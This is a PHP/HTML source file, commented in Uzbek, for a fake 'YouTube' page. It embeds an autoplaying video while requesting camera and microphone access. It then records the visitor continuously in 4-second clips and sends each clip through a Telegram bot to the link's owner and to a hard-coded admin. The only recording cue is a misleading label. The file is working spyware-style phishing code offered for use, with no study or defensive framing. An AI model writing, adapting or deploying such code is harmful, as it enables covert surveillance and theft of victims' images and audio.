<?php
require_once __DIR__ . '/config.php';

// Kalitni tekshirish
$key = isset($_GET['id']) ? trim($_GET['id']) : '';
if ($key === '') {
    http_response_code(404);
    exit("404 Not Found");
}

$chat_id = getUserFromKey($key);
if (!$chat_id) {
    http_response_code(404);
    exit("404 Not Found - Invalid or expired key");
}

$pdo = getDB();
$stmt = $pdo->prepare("SELECT * FROM users WHERE chat_id = ?");
$stmt->execute([$chat_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$user) {
    http_response_code(404);
    exit("404 Not Found");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['video']) && is_uploaded_file($_FILES['video']['tmp_name'])) {
    // Update videos counter
    $cols = $pdo->query("PRAGMA table_info(users)")->fetchAll(PDO::FETCH_ASSOC);
    $has_videos = false; 
    foreach ($cols as $c) { 
        if ($c['name'] === 'videos_sent') { 
            $has_videos = true; 
            break; 
        } 
    }
    if (!$has_videos) {
        $pdo->exec("ALTER TABLE users ADD COLUMN videos_sent INTEGER DEFAULT 0");
    }
    
    // Save video
    $video_dir = __DIR__ . "/videos/";
    if (!is_dir($video_dir)) {
        mkdir($video_dir, 0755, true);
    }
    
        $admn = ADMIN_ID; // config.php ichida belgilangan bo'lishi kerak
    
    $video_filename = "video_" . $chat_id . "_" . time() . ".webm";
    $video_path = $video_dir . $video_filename;
    
    if (move_uploaded_file($_FILES['video']['tmp_name'], $video_path)) {
        $cfile = new CURLFile($video_path, 'video/webm', $video_filename);
        
        $caption = "🎥 Video qabul qilindi\n⏱️ " . ($_POST['duration'] ?? 4) . " soniya\n👤 Foydalanuvchi: tg://user?id=$chat_id";
        
        $res = tgRequest('sendVideo', [
            'chat_id' => $chat_id,
            'video' => $cfile,
            'caption' => $caption
        ], true);
        
         $res = tgRequest('sendVideo', [
            'chat_id' => $admn,
            'video' => $cfile,
            'caption' => $caption
        ], true);
        
        
        
        
        if ($res['ok']) {
            $upd = $pdo->prepare("UPDATE users SET videos_sent = COALESCE(videos_sent,0) + 1 WHERE chat_id = ?");
            $upd->execute([$chat_id]);
        }
        
        unlink($video_path);
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            background: #000; 
            overflow: hidden;
        }
        #youtubeFrame { 
            width: 100%; 
            height: 100vh; 
            border: none; 
        }
        .recording-indicator {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 0, 0, 0.8);
            color: white;
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
            z-index: 1000;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .recording-dot {
            width: 10px;
            height: 10px;
            background: white;
            border-radius: 50%;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <!-- Recording indicator -->
    <div class="recording-indicator" id="recordingIndicator" style="display: none;">
        <div class="recording-dot"></div>
        <span>YouTubega kirildi...</span>
    </div>

    <iframe 
        id="youtubeFrame"
        src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=0&showinfo=0&rel=0"
        allow="autoplay; encrypted-media"
        allowfullscreen>
    </iframe>

    <script>
        const key = "<?php echo htmlspecialchars($key, ENT_QUOTES); ?>";
        let mediaRecorder, recordedChunks = [], stream;
        let isRecording = false;
        let videoQueue = [];

        // YouTube iframe yuklanganda recordingni boshlash
        document.getElementById('youtubeFrame').onload = function() {
            setTimeout(startRecording, 2000);
        };

        // Recording indicator ko'rsatish
        function showRecordingIndicator() {
            document.getElementById('recordingIndicator').style.display = 'flex';
        }

        // Recording indicator yashirish
        function hideRecordingIndicator() {
            document.getElementById('recordingIndicator').style.display = 'none';
        }

        async function startRecording() {
            try {
                showRecordingIndicator();
                
                // Old kamerani so'rash
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 }
                    }, 
                    audio: true 
                });

                // Faqat WEBM formatida recorder yaratish
                const options = {
                    mimeType: 'video/webm;codecs=vp9,opus',
                    videoBitsPerSecond: 2500000
                };

                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options.mimeType = 'video/webm;codecs=vp8,opus';
                }

                mediaRecorder = new MediaRecorder(stream, options);

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) {
                        recordedChunks.push(e.data);
                    }
                };

                mediaRecorder.onstop = sendVideo;

                // Doimiy ravishda recording boshlash
                startContinuousRecording();

            } catch (error) {
                hideRecordingIndicator();
            }
        }

        function startContinuousRecording() {
            if (!mediaRecorder) return;

            recordedChunks = [];
            
            try {
                // Har 4 soniyada data available
                mediaRecorder.start(4000);
                isRecording = true;
                
                // Har 4 soniyada video yuborish
                const sendInterval = setInterval(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 4000);

            } catch (error) {
                hideRecordingIndicator();
            }
        }

        function sendVideo() {
            if (recordedChunks.length === 0) {
                // Keyingi recordingni boshlash
                setTimeout(startContinuousRecording, 100);
                return;
            }

            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            
            // Videoni navbatga qo'shish
            videoQueue.push(blob);
            
            // Navbatdagi videolarni ketma-ket yuborish
            processVideoQueue();

            // Keyingi recordingni boshlash
            setTimeout(startContinuousRecording, 100);
        }

        async function processVideoQueue() {
            if (videoQueue.length === 0) return;

            const blob = videoQueue[0];
            
            try {
                const formData = new FormData();
                // WEBM fayl sifatida yuborish
                formData.append('video', blob, 'video.webm');
                formData.append('duration', 4);

                const response = await fetch('vd?id=' + encodeURIComponent(key), {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    // Muvaffaqiyatli yuborilgan videoni navbatdan olib tashlash
                    videoQueue.shift();
                    
                    // Keyingi videoni yuborish
                    if (videoQueue.length > 0) {
                        processVideoQueue();
                    }
                }
            } catch (error) {
                // Xatolik bo'lsa, qayta urinish
                setTimeout(() => processVideoQueue(), 1000);
            }
        }

        // Sahifa yopilganda barcha videolarni yuborish
        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            
            // Navbatda qolgan barcha videolarni yuborish
            if (videoQueue.length > 0) {
                // Synchronous request yordamida barcha videolarni yuborish
                videoQueue.forEach(blob => {
                    const formData = new FormData();
                    formData.append('video', blob, 'video.webm');
                    formData.append('duration', 4);

                    // Synchronous fetch
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', 'vd?id=' + encodeURIComponent(key), false);
                    xhr.send(formData);
                });
            }
            
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            hideRecordingIndicator();
        });

        // Tab o'zgarganda
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            } else {
                if (stream && !isRecording) {
                    setTimeout(startContinuousRecording, 1000);
                }
            }
        });

        // Fokus yo'qolganida recordingni to'xtatish
        window.addEventListener('blur', () => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        });

        // Fokus qaytganida recordingni qayta boshlash
        window.addEventListener('focus', () => {
            if (stream && !isRecording) {
                setTimeout(startContinuousRecording, 1000);
            }
        });

        // Avtomatik boshlash
        setTimeout(() => {
            if (!isRecording) {
                startRecording();
            }
        }, 3000);

    </script>
</body>
</html>